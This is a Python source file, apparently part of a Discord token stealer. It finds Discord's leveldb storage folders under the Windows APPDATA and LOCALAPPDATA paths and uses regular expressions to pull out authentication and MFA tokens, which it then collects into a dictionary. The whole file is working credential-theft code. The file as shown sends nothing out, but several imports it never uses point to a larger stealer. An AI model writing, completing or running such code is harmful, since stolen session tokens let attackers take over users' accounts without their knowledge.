import os
import re
import json
import sqlite3
import shutil
import tempfile

DISCORD_PATHS = [
    os.path.join(os.environ.get("APPDATA", ""), "discord"),
    os.path.join(os.environ.get("APPDATA", ""), "discordptb"),
    os.path.join(os.environ.get("LOCALAPPDATA", ""), "discord"),
    os.path.join(os.environ.get("LOCALAPPDATA", ""), "discordptb"),
]


def find_ldb_files(path: str) -> list[str]:
    results = []
    ldb_dir = os.path.join(path, "Local Storage", "leveldb")
    if os.path.exists(ldb_dir):
        for f in os.listdir(ldb_dir):
            if f.endswith((".ldb", ".log")):
                results.append(os.path.join(ldb_dir, f))
    return results


def extract_tokens_from_files(files: list[str]) -> list[str]:
    tokens = set()
    token_pattern = re.compile(r"[a-zA-Z0-9_-]{24,26}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,39}")
    mfa_pattern = re.compile(r"mfa\.[a-zA-Z0-9_-]{80,100}")
    for fp in files:
        try:
            with open(fp, "r", errors="ignore") as f:
                content = f.read()
            for m in token_pattern.findall(content):
                tokens.add(m)
            for m in mfa_pattern.findall(content):
                tokens.add(m)
        except Exception:
            pass
    return list(tokens)


def extract_discord_info() -> dict:
    result = {"tokens": [], "profiles": []}
    for base in DISCORD_PATHS:
        if not os.path.exists(base):
            continue
        ldb_files = find_ldb_files(base)
        tokens = extract_tokens_from_files(ldb_files)
        result["tokens"].extend(tokens)
        settings_path = os.path.join(base, "Local Storage", "leveldb")
        if settings_path:
            result["profiles"].append({"path": base, "tokens_found": len(tokens)})
    result["tokens"] = list(set(result["tokens"]))
    return result
